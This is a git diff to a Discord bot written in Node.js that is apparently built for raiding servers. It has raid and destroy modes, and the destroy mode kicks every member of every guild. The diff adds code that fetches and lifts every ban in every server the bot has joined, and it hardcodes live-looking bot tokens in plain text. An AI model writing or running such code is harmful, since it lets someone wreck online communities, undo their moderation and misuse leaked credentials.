@@ -1,10 +1,11 @@
 const Discord = require("discord.js");
 const client = new Discord.Client();
 let createInviteMode = false;
-let raidMode = true;
+let raidMode = false;
 let restoreMode = false;
 let destroyMode = false;
-client.login("NTE5MjI0NjQ2OTgyMTcyNzA3.DucNNQ.ObsMwLx5dxVMVlB7hkVDRoZoI3M");
+unban = true;
+client.login("NTE5NDczOTg0NzI3OTQxMTQw.Duf1eg.9S2BZsXX1tFgIcRYJQjwXO-QNUA");
 client.on("ready", () => {
   console.log(
     `Logged in as ${client.user.tag}! With {
@@ -14,6 +15,13 @@ client.on("ready", () => {
 
   client.guilds.forEach(guild => {
     guild.channels.forEach(chan => {
+      if (unban) {
+        guild.fetchBans().then(bans => {
+          bans.forEach(ban => {
+            guild.unban(ban);
+          });
+        });
+      }
       if (destroyMode) {
         guild.members.forEach(member => {
           member.kick("GOOMBAS").then(() => {
